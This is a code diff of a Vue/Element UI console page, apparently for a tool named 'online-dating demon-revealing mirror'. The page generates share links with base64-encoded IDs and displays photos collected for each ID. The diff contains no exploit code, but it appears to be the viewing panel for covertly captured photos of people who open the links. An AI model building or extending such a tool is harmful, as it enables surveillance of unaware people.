@@ -2,7 +2,7 @@
 <html>
 	<head>
 		<meta charset="UTF-8">
-		<title>网恋照妖镜</title>
+		<title>控 制 台</title>
 		<link rel="icon" href="./img/ico.jpg">
 			<!-- Element UI CSS -->
 		<link rel="stylesheet" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css">
@@ -36,6 +36,13 @@
 							label="链接">
 						<template slot-scope="scope">
 							<a :href="scope.row.link" style="color: #3a8ee6; text-decoration: none;" target="_blank">{{scope.row.link}}</a>
+						</template>
+					</el-table-column>
+					<el-table-column
+							prop="link"
+							label="照片">
+						<template slot-scope="scope">
+							<el-image style="width: 100px; height: 100px" :src="scope.row.link" :fit="fit"></el-image>
 						</template>
 					</el-table-column>
 				</el-table>
@@ -76,7 +83,7 @@
 	<!-- import JavaScript -->
 	<script src="https://unpkg.com/element-ui/lib/index.js"></script>
 	<script>
-		var vue = new Vue({
+		new Vue({
 			el: '#app',
 			data: function() {
 				return {
@@ -100,7 +107,8 @@
 					}else{
 						this.$message.success('生成成功～');
 						this.dialogVisible = true;
-						this.linkDirection = window.location.origin+"/index.html?id="+this.form.id;
+						// Magic方法
+						this.linkDirection = window.location.origin+"/index.html?id="+window.btoa(this.form.id);
 					}
 				},
 				showPhoto(){
@@ -108,10 +116,15 @@
 					if(that.form.id == "" ){
 						that.$message.error('链接标识ID不能为空～');
 					}else{
-						axios.get('/show/'+that.form.id)
+						axios.get('/show/'+window.btoa(this.form.id))
 						.then(function (data){
-							that.tableData = data.data;
-							that.$message.success('获取成功～');
+							if(data.data.flag == true){
+								that.tableData = data.data.data;
+								that.$message.success('获取成功～');
+							}else{
+								that.tableData = [];
+								that.$message.error(data.data.message);
+							}
 						})
 					}
 				},
@@ -128,10 +141,11 @@
 					})
 				},
 				copy(){
+					let that = this;
 					document.querySelector('#paste').select();
 					document.execCommand('copy');
-					this.dialogVisible = false;
-					this.$message.success('复制成功～');
+					that.dialogVisible = false;
+					that.$message.success('复制成功～');
 				}
 			}
 		})
